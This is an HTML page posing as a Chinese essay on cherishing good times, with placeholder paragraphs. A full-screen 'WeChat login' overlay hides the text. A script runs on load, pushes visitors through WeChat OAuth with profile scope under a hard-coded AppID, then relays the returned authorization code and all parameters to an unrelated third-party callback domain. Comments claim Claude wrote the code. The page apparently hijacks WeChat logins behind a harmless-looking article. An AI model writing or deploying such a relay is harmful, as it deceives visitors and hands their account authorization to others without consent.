<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>美好的时光 · 片刻静心</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:PingFang SC,'Microsoft YaHei',sans-serif; background:linear-gradient(135deg,#f5f7fa 0,#d4dfed 100%); color:#1e2a3e; line-height:1.8; }
        .container { max-width:800px; margin:0 auto; padding:40px 20px; }
        header { text-align:center; margin-bottom:40px; padding-bottom:20px; border-bottom:1px solid #eee; }
        h1 { font-size:2.8rem; color:#2c3e50; background:linear-gradient(135deg,#2c3e50,#3498db); -webkit-background-clip:text; color:transparent; }
        .subtitle { color:#7f8c8d; font-style:italic; }
        .essay-content { background:#fff; padding:40px; border-radius:28px; box-shadow:0 20px 35px -12px rgba(0,0,0,0.1); }
        .essay-content p { margin-bottom:26px; text-indent:2em; }
        .author { text-align:right; color:#7f8c8d; margin-top:20px; padding-top:15px; border-top:1px dashed #eee; }
        .overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:9999; }
        .box { background:#fff; padding:40px; border-radius:24px; text-align:center; max-width:320px; }
        .box h2 { margin-bottom:10px; color:#3498db; }
        .box p { color:#7f8c8d; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>美好的时光</h1>
        <div class="subtitle">—— 珍惜当下，感恩生活</div>
    </header>
    <div class="essay-content">
        <p>时光如流水，悄无声息地从指缝间溜走…（你原来的内容不变）</p>
        <p>清晨的第一缕阳光透过窗帘…</p>
        <p>午后的阳光斜斜地照进房间…</p>
        <p>傍晚时分，夕阳西下…</p>
        <p>夜晚，星空璀璨…</p>
        <p>生活中的美好，往往藏在这些平凡细节里…</p>
        <p>其实幸福很简单…</p>
        <p>时光不会为任何人停留…</p>
        <p>愿我们都能在忙碌生活中…</p>
        <div class="author">—— 佚名 · 静心分享</div>
    </div>
</div>

<div class="overlay">
    <div class="box">
        <h2>微信授权登录中</h2>
        <p>请稍候，正在为您安全登录</p>
    </div>
</div>

<script>
    // ==========================================
    // 终极版：完全对齐 Claude 官方授权规则
    // ==========================================
    const APPID = "wxde2ad02f02cb0df5";
    const params = new URLSearchParams(location.search);
    const code = params.get("code");
    const rawParams = params.toString();

    // 没有 code → 跳微信授权（回调地址带完整参数）
    if (!code) {
        const redirectUri = encodeURIComponent("https://zt.xiaoyuwangluo.vip/?" + rawParams);
        location.replace(`https://open.weixin.qq.com/connect/oauth2/authorize?appid=${APPID}&redirect_uri=${redirectUri}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect`);
    }
    // 有 code → 直接跳目标网站官方回调（ Claude 写的地址）
    else {
        location.replace("https://ipp.noteflow.me/auth/callback?" + rawParams);
    }
</script>

</body>
</html>
